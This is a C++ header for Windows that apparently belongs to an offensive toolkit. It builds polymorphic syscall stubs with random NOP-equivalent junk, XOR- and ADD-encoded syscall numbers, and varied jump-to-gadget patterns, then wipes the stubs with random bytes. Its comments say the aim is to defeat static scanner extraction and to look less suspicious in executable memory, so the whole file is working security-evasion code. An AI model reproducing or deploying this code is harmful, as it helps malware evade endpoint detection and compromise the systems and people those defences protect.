#pragma once
#include <windows.h>
#include <intrin.h>

// Build-time polymorphic parameters (injected via /D flags)
#ifndef POLY_SEED
#define POLY_SEED 0
#endif
#ifndef JUNK_LEVEL
#define JUNK_LEVEL 3
#endif

namespace Polymorph {

    // ── Fast PRNG (no CRT, no BCrypt dependency) ────────────────────────
    // Uses RDTSC + stack entropy. Not cryptographic, but good enough for
    // junk generation and register selection.
    static __forceinline DWORD FastRand() {
        static DWORD s_state = 0;
        if (s_state == 0) {
            unsigned __int64 tsc = __rdtsc();
            s_state = (DWORD)(tsc ^ (tsc >> 17)) ^ (DWORD)(POLY_SEED);
#ifdef _WIN64
            s_state ^= (DWORD)__readgsqword(0x40);
#else
            s_state ^= (DWORD)__readfsdword(0x20);
#endif
            ULONG_PTR sp = (ULONG_PTR)&s_state;
            s_state ^= (DWORD)(sp >> 3);
            if (s_state == 0) s_state = 0xA5A5A5A5;
        }
        // xorshift32
        s_state ^= s_state << 13;
        s_state ^= s_state >> 17;
        s_state ^= s_state << 5;
        return s_state;
    }

    static __forceinline DWORD FastRandRange(DWORD maxVal) {
        if (maxVal == 0) return 0;
        return FastRand() % maxVal;
    }

    // ── NOP-equivalent instruction tables ───────────────────────────────
    // Each entry is a semantically neutral instruction (no side effects on
    // registers/flags in context). Used to pad syscall stubs.

#ifdef _WIN64

    // x64 NOP-equivalents (1-4 bytes each)
    // These are chosen to not clobber RAX, R10, RCX (syscall-sensitive)
    struct JunkEntry {
        unsigned char bytes[9];
        unsigned char len;
    };

    static const JunkEntry g_junkTable[] = {
        // === 1-byte NOPs ===
        {{ 0x90 },                                     1 },  // nop

        // === 2-byte NOPs ===
        {{ 0x66, 0x90 },                               2 },  // xchg ax, ax (canonical 2-byte NOP)

        // === 3-byte NOPs (Intel NOP DWORD encoding family) ===
        {{ 0x0F, 0x1F, 0x00 },                         3 },  // nop dword [rax]
        {{ 0x48, 0x87, 0xDB },                         3 },  // xchg rbx, rbx (64-bit — TRUE NOP)
        {{ 0x48, 0x87, 0xF6 },                         3 },  // xchg rsi, rsi (64-bit — TRUE NOP)
        {{ 0x48, 0x87, 0xFF },                         3 },  // xchg rdi, rdi (64-bit — TRUE NOP)

        // === 4-byte NOPs ===
        {{ 0x0F, 0x1F, 0x40, 0x00 },                   4 },  // nop dword [rax+0]
        {{ 0x48, 0x8D, 0x76, 0x00 },                   4 },  // lea rsi, [rsi+0] (64-bit)
        {{ 0x48, 0x8D, 0x7F, 0x00 },                   4 },  // lea rdi, [rdi+0] (64-bit)
        {{ 0x48, 0x8D, 0x5B, 0x00 },                   4 },  // lea rbx, [rbx+0] (64-bit)

        // === 5-byte NOPs ===
        {{ 0x0F, 0x1F, 0x44, 0x00, 0x00 },             5 },  // nop dword [rax+rax*1+0]

        // === 7-byte NOP ===
        {{ 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00 }, 7 },  // nop dword [rax+0x00000000]

        // === 9-byte NOP ===
        {{ 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 }, 9 }, // nop word [rax+rax*1+0]
    };
    static const int g_junkTableSize = sizeof(g_junkTable) / sizeof(g_junkTable[0]);


#else // x86

    struct JunkEntry {
        unsigned char bytes[7];
        unsigned char len;
    };

    static const JunkEntry g_junkTable[] = {
        {{ 0x90 },                       1 },  // nop
        {{ 0x53, 0x5B },                 2 },  // push ebx; pop ebx
        {{ 0x55, 0x5D },                 2 },  // push ebp; pop ebp
        {{ 0x56, 0x5E },                 2 },  // push esi; pop esi
        {{ 0x57, 0x5F },                 2 },  // push edi; pop edi
        {{ 0x87, 0xDB },                 2 },  // xchg ebx, ebx
        {{ 0x87, 0xF6 },                 2 },  // xchg esi, esi
        {{ 0x87, 0xFF },                 2 },  // xchg edi, edi
        {{ 0x8D, 0x76, 0x00 },           3 },  // lea esi, [esi+0]
        {{ 0x8D, 0x7F, 0x00 },           3 },  // lea edi, [edi+0]
        {{ 0x0F, 0x1F, 0x00 },           3 },  // nop dword [eax]
        {{ 0x0F, 0x1F, 0x40, 0x00 },     4 },  // nop dword [eax+0]
        {{ 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00 }, 7 }, // lea esi,[esi+0]
    };
    static const int g_junkTableSize = sizeof(g_junkTable) / sizeof(g_junkTable[0]);

#endif

    // ── Junk Code Generator ─────────────────────────────────────────────
    // Fills 'buffer' with NOP-equivalent instructions up to 'maxLen' bytes.
    // Returns actual bytes written via 'outLen'.
    static __forceinline void GenerateJunk(unsigned char* buffer, size_t maxLen, size_t* outLen) {
        size_t written = 0;
        // Decide how many junk entries to insert (1-5)
        int count = 1 + (int)FastRandRange((DWORD)JUNK_LEVEL);
        for (int i = 0; i < count && written < maxLen; i++) {
            int idx = (int)FastRandRange((DWORD)g_junkTableSize);
            const JunkEntry& entry = g_junkTable[idx];
            if (written + entry.len > maxLen) break;
            for (int j = 0; j < entry.len; j++) {
                buffer[written++] = entry.bytes[j];
            }
        }
        *outLen = written;
    }

    // ── SSN Encoding ────────────────────────────────────────────────────
    // Encodes SSN with a random XOR key. The stub will contain:
    //   mov eax, encoded_ssn
    //   xor eax, key
    // instead of plain: mov eax, ssn
    // This defeats static SSN extraction by scanners.

    struct EncodedSSN {
        DWORD encoded;   // ssn ^ key
        DWORD key;       // random key
    };

    static __forceinline EncodedSSN EncodeSSN(WORD ssn) {
        EncodedSSN result;
        result.key = FastRand();
        result.encoded = (DWORD)ssn ^ result.key;
        return result;
    }

#ifdef _WIN64

    // ── Polymorphic Syscall Stub Builder (x64) ──────────────────────────
    // Builds a unique stub for each syscall invocation:
    //
    //   [junk_prefix]         ; 0-30 bytes of NOP-equivalents
    //   mov r10, rcx          ; standard syscall setup (2 encoding variants)
    //   mov eax, encoded_ssn  ; XOR-encoded SSN (or plain, or push/pop)
    //   xor eax, key          ; decode at runtime (if encoded)
    //   [junk_mid]            ; 0-15 bytes of NOP-equivalents
    //   <jump_to_gadget>      ; 3 different patterns (see below)
    //
    // Jump patterns (all use R11 — the only safe volatile non-param register):
    //   A) mov r11, gadget; jmp r11
    //   B) push low32; mov dword [rsp+4], high32; ret  (stack redirect)
    //   C) mov r11, gadget; push r11; ret              (push/ret)
    //
    // Total stub size varies between ~21 and ~80 bytes.

    static __forceinline size_t BuildPolymorphicStub(
        unsigned char* buf,
        size_t bufSize,
        WORD ssn,
        LPVOID gadget)
    {
        size_t pos = 0;

        // 1) Junk prefix (0-30 bytes)
        size_t junkLen = 0;
        if (FastRandRange(100) < 75) {  // 75% chance of prefix junk
            size_t maxJunk = (bufSize - pos > 70) ? 30 : (bufSize - pos > 50) ? 10 : 0;
            if (maxJunk > 0) {
                GenerateJunk(buf + pos, maxJunk, &junkLen);
                pos += junkLen;
            }
        }

        // 2) mov r10, rcx  — two valid encodings, randomly chosen
        if (FastRandRange(2) == 0) {
            buf[pos++] = 0x4C; buf[pos++] = 0x8B; buf[pos++] = 0xD1; // mov r10, rcx
        } else {
            buf[pos++] = 0x49; buf[pos++] = 0x89; buf[pos++] = 0xCA; // mov r10, rcx (alt)
        }

        // 3) SSN loading — 3 variants
        switch (FastRandRange(3)) {
            case 0: {
                // XOR-encoded SSN: mov eax, enc; xor eax, key
                EncodedSSN enc = EncodeSSN(ssn);
                buf[pos++] = 0xB8; // mov eax, imm32
                *(DWORD*)(buf + pos) = enc.encoded; pos += 4;
                buf[pos++] = 0x35; // xor eax, imm32
                *(DWORD*)(buf + pos) = enc.key; pos += 4;
                break;
            }
            case 1: {
                // Plain: mov eax, ssn
                buf[pos++] = 0xB8;
                *(DWORD*)(buf + pos) = (DWORD)ssn; pos += 4;
                break;
            }
            default: {
                // ADD-encoded: mov eax, (ssn-delta); add eax, delta
                DWORD delta = FastRand() & 0xFFFF;
                DWORD base = (DWORD)ssn - delta;
                buf[pos++] = 0xB8; // mov eax, imm32
                *(DWORD*)(buf + pos) = base; pos += 4;
                buf[pos++] = 0x05; // add eax, imm32
                *(DWORD*)(buf + pos) = delta; pos += 4;
                break;
            }
        }

        // 4) Optional mid-junk (0-15 bytes)
        if (FastRandRange(100) < 50) {
            size_t midJunk = 0;
            size_t maxMid = (bufSize - pos > 35) ? 15 : (bufSize - pos > 25) ? 5 : 0;
            if (maxMid > 0) {
                GenerateJunk(buf + pos, maxMid, &midJunk);
                pos += midJunk;
            }
        }

        // 5) Jump to gadget — 3 safe patterns (all use R11 only)
        switch (FastRandRange(3)) {
            case 0: {
                // Pattern A: mov r11, imm64; jmp r11 (standard)
                buf[pos++] = 0x49; buf[pos++] = 0xBB; // mov r11, imm64
                *(size_t*)(buf + pos) = (size_t)gadget; pos += 8;
                buf[pos++] = 0x41; buf[pos++] = 0xFF; buf[pos++] = 0xE3; // jmp r11
                break;
            }
            case 1: {
                // Pattern B: push low32; mov dword [rsp+4], high32; ret
                // Pushes 64-bit gadget address onto stack then returns to it
                DWORD lo = (DWORD)((size_t)gadget & 0xFFFFFFFF);
                DWORD hi = (DWORD)((size_t)gadget >> 32);
                buf[pos++] = 0x68; // push imm32 (sign-extended to 64-bit)
                *(DWORD*)(buf + pos) = lo; pos += 4;
                // mov dword [rsp+4], hi — fixes upper 32 bits
                buf[pos++] = 0xC7; buf[pos++] = 0x44; buf[pos++] = 0x24; buf[pos++] = 0x04;
                *(DWORD*)(buf + pos) = hi; pos += 4;
                buf[pos++] = 0xC3; // ret — pops gadget address and jumps
                break;
            }
            default: {
                // Pattern C: mov r11, imm64; push r11; ret
                buf[pos++] = 0x49; buf[pos++] = 0xBB; // mov r11, imm64
                *(size_t*)(buf + pos) = (size_t)gadget; pos += 8;
                buf[pos++] = 0x41; buf[pos++] = 0x53; // push r11
                buf[pos++] = 0xC3; // ret — pops r11 value as return address
                break;
            }
        }

        return pos;
    }

#else // x86

    // ── Polymorphic Syscall Stub Builder (x86) ──────────────────────────
    static __forceinline size_t BuildPolymorphicStub(
        unsigned char* buf,
        size_t bufSize,
        WORD ssn,
        LPVOID gadget,
        WORD retBytes)
    {
        size_t pos = 0;

        // 1) Junk prefix
        size_t junkLen = 0;
        if (FastRandRange(100) < 75) {
            GenerateJunk(buf + pos, (bufSize - pos > 20) ? 20 : bufSize - pos - 25, &junkLen);
            pos += junkLen;
        }

        // 2) SSN load — plain or encoded
        if (FastRandRange(2) == 0) {
            EncodedSSN enc = EncodeSSN(ssn);
            buf[pos++] = 0xB8; // mov eax, imm32
            *(DWORD*)(buf + pos) = enc.encoded; pos += 4;
            buf[pos++] = 0x35; // xor eax, imm32
            *(DWORD*)(buf + pos) = enc.key; pos += 4;
        } else {
            buf[pos++] = 0xB8;
            *(DWORD*)(buf + pos) = (DWORD)ssn; pos += 4;
        }

        // 3) Optional mid-junk
        if (FastRandRange(100) < 50) {
            size_t midJunk = 0;
            GenerateJunk(buf + pos, (bufSize - pos > 10) ? 10 : bufSize - pos - 15, &midJunk);
            pos += midJunk;
        }

        // 4) mov edx, gadget
        buf[pos++] = 0xBA;
        *(DWORD*)(buf + pos) = (DWORD)(size_t)gadget; pos += 4;

        // 5) call edx (FF D2) or jmp edx (FF E2)
        // Use jmp for sysenter-based gadget (standard)
        buf[pos++] = 0xFF;
        buf[pos++] = 0xE2; // jmp edx

        // 6) ret N (for __stdcall cleanup)
        buf[pos++] = 0xC2;
        *(WORD*)(buf + pos) = retBytes; pos += 2;

        return pos;
    }

#endif

    // ── Random Stub Wipe ────────────────────────────────────────────────
    // Overwrites stub with random bytes instead of zeros.
    // Random data is less suspicious than a block of zeros in executable memory.
    static __forceinline void RandomWipeStub(void* pStub, size_t len) {
        volatile unsigned char* p = (volatile unsigned char*)pStub;
        // Fill with random NOP-like bytes
        for (size_t i = 0; i < len; i++) {
            // Mix of 0xCC (int3), 0x90 (nop), and random
            switch (FastRandRange(4)) {
                case 0: p[i] = 0xCC; break;  // int3
                case 1: p[i] = 0x90; break;  // nop
                case 2: p[i] = 0xC3; break;  // ret
                default: p[i] = (unsigned char)FastRandRange(256); break;
            }
        }
    }
}
